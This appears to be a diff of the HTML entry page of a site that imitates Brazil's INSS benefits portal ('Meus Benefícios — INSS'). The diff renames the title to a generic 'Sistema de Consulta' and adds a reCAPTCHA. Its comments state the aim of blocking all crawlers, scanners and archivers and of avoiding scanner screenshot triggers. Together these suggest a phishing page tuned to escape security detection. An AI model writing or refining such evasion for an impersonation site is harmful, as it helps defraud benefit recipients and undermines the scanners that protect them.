@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Meus Benefícios — INSS</title>
+    <title>Sistema de Consulta</title>
     
     <!-- Anti-indexing: block ALL crawlers, scanners, archivers -->
     <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate" />
@@ -18,10 +18,12 @@
     
     <!-- No OpenGraph / social preview (prevents screenshot previews) -->
     <!-- Intentionally empty to avoid scanner screenshot triggers -->
+    
+    <!-- reCAPTCHA v2 -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 
   <body>
-    <link rel="icon" href="/favicon.png" type="image/png">
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
   </body>
